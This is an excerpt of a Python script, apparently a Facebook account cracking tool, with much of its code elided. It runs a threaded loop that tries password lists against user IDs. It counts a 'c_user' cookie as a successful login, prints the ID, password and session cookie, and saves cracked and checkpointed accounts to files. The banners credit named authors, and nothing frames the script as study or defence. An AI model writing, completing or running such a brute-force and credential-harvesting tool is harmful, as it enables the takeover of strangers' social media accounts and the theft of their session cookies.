...
print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate \033[0;34mby Mehedi \033[0;32mvai...............')
...
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mPRINCE LIKHON🙂💔🪽
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as DEVIL:
        ...
        print('[+] 𝐔𝐒𝐄 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝐅𝐎𝐑 𝐒𝐏𝐄𝐄𝐃 𝐔𝐏 » 𝐌ahadi 𝐁𝐫𝐚𝐧𝐝')
        print('==================================================')
        for love in user:
    ...
    print(' [+] OK Ids saved in Mahadi/OK.txt')
    print(' [+] CP Ids saved in Mahadi/CP.txt')
    print('==================================================')
def MrDevilEx2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Mahadi]--[%s/%s]--[𝐎𝐊%s]~[𝐂𝐏-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[Mahadi-OK] {uid}|{ps} \nCookie : {coki}")
